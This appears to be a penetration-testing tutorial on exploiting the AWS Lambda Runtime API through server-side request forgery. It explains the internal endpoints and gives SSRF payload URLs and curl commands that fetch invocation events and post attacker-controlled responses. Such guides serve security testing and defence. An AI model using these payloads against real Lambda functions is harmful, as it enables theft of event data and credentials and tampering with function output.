---
title: Exploiting AWS Lambda Runtime API via SSRF
description: Learn to exploit AWS Lambda Runtime API using SSRF to extract data and
  manipulate execution.
keywords:
- AWS Lambda
- Runtime API
- Server-Side Request Forgery
- SSRF
- cloud security
- Lambda exploitation
- API endpoints
---

# Lambda Runtime API

## Context

This article aims to demonstrate how to exploit the AWS Lambda Runtime API through Server-Side Request Forgery (SSRF). By leveraging SSRF, an attacker can interact with Lambda execution environments to extract sensitive data. This content assumes you are familiar with crafting and manipulating HTTP requests, enumerating API endpoints, understanding cloud service architecture, and the basics of SSRF exploitation.

## Theory

### Lambda Runtime API Overview

The Lambda Runtime API is an integral part of AWS Lambda's serverless compute service. It is an internal HTTP API specifically designed for custom runtimes to communicate with the Lambda service. Custom runtimes use this API to receive invocation events and send back responses or errors. The API is accessible only within the Lambda execution environment, usually at the endpoint `http://localhost:9001`. The endpoint `/2018-06-01/runtime/invocation/next` is particularly important as it delivers the next event to the runtime for processing.

### Lambda Execution Context and Security Boundaries

Lambda functions operate in isolated environments known as execution contexts. These contexts provide ephemeral storage and severely restrict network access to ensure security and quick scalability. AWS's security model assumes that only the Lambda runtime process can access the Runtime API. However, SSRF vulnerabilities within the Lambda code can potentially allow attackers to exploit these APIs if they can reach `http://localhost` from within the Lambda environment.

### Attacker Goals and Threat Surface

An attacker with SSRF capabilities can achieve multiple objectives by interacting with the Lambda Runtime API:

- Send requests to the internal API endpoints of Lambda to extract invocation data.
- Access and potentially manipulate the function's execution by routing unexpected data or responses.
- Harvest sensitive information such as environment variables that might contain credentials or configuration details.

### Lambda Runtime API Endpoints of Interest

- **GET /2018-06-01/runtime/invocation/next:** Used to retrieve the next event for the function execution.
- **POST /2018-06-01/runtime/invocation/{requestId}/response:** Allows sending a custom response for a given request ID.
- **POST /2018-06-01/runtime/invocation/{requestId}/error:** Reports errors related to the invocation to Lambda.

## Practice

### SSRF to Extract Lambda Invocation Event via Runtime API

- Identify a potential SSRF entry point in the Lambda function's code or its dependencies. This typically involves finding a user-controllable URL fetch or HTTP request.
- Use the following payload to target the Lambda Runtime API for invocation data:
  
  ```http
  http://localhost:9001/2018-06-01/runtime/invocation/next
  ```

- If you have direct access, use the following command to send a request:

  ```bash
  curl -s -X GET 'http://localhost:9001/2018-06-01/runtime/invocation/next'
  ```

  Note: In most cases, the SSRF vulnerability triggers this request internally on behalf of the attacker.

- Capture and analyze the HTTP response containing the invocation event payload. This response may include sensitive event data, context, and environment variables.

### Enumerate and Manipulate Lambda Runtime API Endpoints via SSRF

- Use SSRF to interact with the following endpoint, replacing `{requestId}` with a valid ID obtained previously:
  
  ```http
  http://localhost:9001/2018-06-01/runtime/invocation/{requestId}/response
  ```

- Craft a response using `curl` for manipulation:

  ```bash
  curl -s -X POST 'http://localhost:9001/2018-06-01/runtime/invocation/{requestId}/response' -d '{"result":"attacker_controlled"}'
  ```

- Observe any changes in Lambda function behavior or output. Manipulating responses may affect the function's processing or logged data.

## Tools

- **curl**
- **Burp Suite**